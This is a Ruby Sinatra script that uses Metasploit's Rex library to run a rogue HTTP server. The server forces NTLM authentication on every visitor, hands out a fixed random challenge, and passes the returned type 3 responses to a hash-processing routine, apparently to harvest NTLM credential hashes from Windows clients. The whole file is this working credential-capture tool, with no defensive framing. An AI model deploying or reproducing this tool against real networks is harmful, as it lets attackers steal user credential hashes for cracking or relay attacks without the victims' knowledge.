require 'sinatra'
require 'rex'
require 'securerandom'
require_relative 'utils.rb'

NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

$domain = "contoso.local"


$challenge = [SecureRandom.hex(8)].pack("H*")
set :bind, '0.0.0.0'
set :server, 'webrick'

before  do
  if request.request_method == 'OPTIONS'
  end
  p
  if request.env['HTTP_AUTHORIZATION'].nil?
     response.header['WWW-Authenticate'] = "NTLM"
     halt 401
  elsif  /^(NTLM|Negotiate) (.+)/ =~ request.env["HTTP_AUTHORIZATION"]
    hash = request.env['HTTP_AUTHORIZATION'].split(' ')[1]
    method = request.env['HTTP_AUTHORIZATION'].split(' ')[0]
    message = Rex::Text.decode_base64(hash)
#    puts request.env    
  
  end
  if !message.nil?
    domain = 'domain'
    server = 'server'
    dom,ws = parse_type1_domain(message)
    if(dom)
      domain = dom
    end
    if(ws)
      server = ws
    end

    if (message[8,1] == "\x01")      
      chalhash = MESSAGE.process_type1_message(hash,$challenge,domain,server,server,$domain, false)
      response.header['WWW-Authenticate'] = "NTLM " + chalhash
      halt 401
    elsif (message[8,1] == "\x03")
      process_hash(hash, $challenge)
    else
      #puts 'not a 1 or 3'
    end
  else
    #puts 'no message'
  end
end


get '/*' do
  'hello world'
end

#post '/*' do
#  puts 'posted'
#end
